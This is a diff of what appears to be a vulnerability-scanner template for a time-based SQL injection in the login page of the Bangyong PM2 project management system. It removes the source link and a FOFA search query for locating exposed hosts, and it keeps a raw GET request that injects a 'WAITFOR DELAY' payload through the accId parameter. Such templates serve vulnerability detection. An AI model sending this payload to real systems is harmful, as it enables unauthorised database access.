@@ -3,12 +3,8 @@ info:
   name: 邦永PM2项目管理系统Global_UserLogin.aspx SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vnidr02l463xgq2y'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: vnidr02l463xgq2y
-    fofa: body="PM2项目管理"
 http:
 - raw:
   - 'GET /Global/Global_UserLogin.aspx?accId=1%27%3BWAITFOR+DELAY+%270%3A0%3A1%27--&loginCode&password&type HTTP/1.1
